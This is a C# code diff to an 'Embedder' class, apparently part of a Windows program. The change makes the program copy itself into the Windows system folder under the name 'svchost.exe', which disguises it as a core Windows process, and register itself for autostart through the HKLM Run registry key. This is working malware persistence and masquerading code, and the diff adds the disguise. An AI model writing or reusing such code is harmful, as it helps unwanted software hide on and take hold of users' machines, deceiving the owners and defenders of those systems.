@@ -8,33 +8,18 @@ namespace Type
     class Embedder
     {
         private const int NAME_LEN = 8;
-        private const char PATH_DELIM = '\\';
         private const char START_CHAR = 'a';
         private const char QUOT = '\"';
-        private const string RUN = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-        private const string RUN_NAME = "type-bin";
-        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.ProgramFilesX86;
-        private const string RUN_EXTENSION = ".exe";
-
-        private static string RandomName()
-        {
-            StringBuilder sb = new StringBuilder();
-            sb.Append(PATH_DELIM);
-            Random rand = new Random((int)DateTime.Now.Ticks);
-            for (int i = 0; i < NAME_LEN; i++)
-            {
-                char ch = (char)((int)START_CHAR + rand.Next(0, 26));
-                sb.Append(ch);
-            }
-            sb.Append(RUN_EXTENSION);
-            return (sb.ToString());
-        }
+        private const string KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        private const string KEY_VALUE = "type-bin";
+        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.Windows;
+        private const string EXE_NAME = @"\svchost.exe";
 
         private static bool IsInstalled()
         {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(RUN, true);
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(KEY, true);
             string path;
-            if ((path = (string)key.GetValue(RUN_NAME)) == null)
+            if ((path = (string)key.GetValue(KEY_VALUE)) == null)
             {
                 return false;
             }
@@ -47,7 +32,7 @@ namespace Type
                 }
                 else
                 {
-                    key.DeleteValue(RUN_NAME, false);
+                    key.DeleteValue(KEY_VALUE, false);
                     return false;
                 }
             }
@@ -72,7 +57,7 @@ namespace Type
             FileInfo applicationInfo = new FileInfo(me);
 
             string dest = Environment.GetFolderPath(EMBED_LOC);
-            string name = RandomName();
+            string name = EXE_NAME;
             string target = (dest + name);
 
             Install(me, target);
@@ -86,8 +71,8 @@ namespace Type
 
         private static void SetRegistryAutoStart(string target)
         {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(RUN, true);
-            key.SetValue(RUN_NAME, Quote(target));
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(KEY, true);
+            key.SetValue(KEY_VALUE, Quote(target));
         }
 
         private static string Quote(string text)
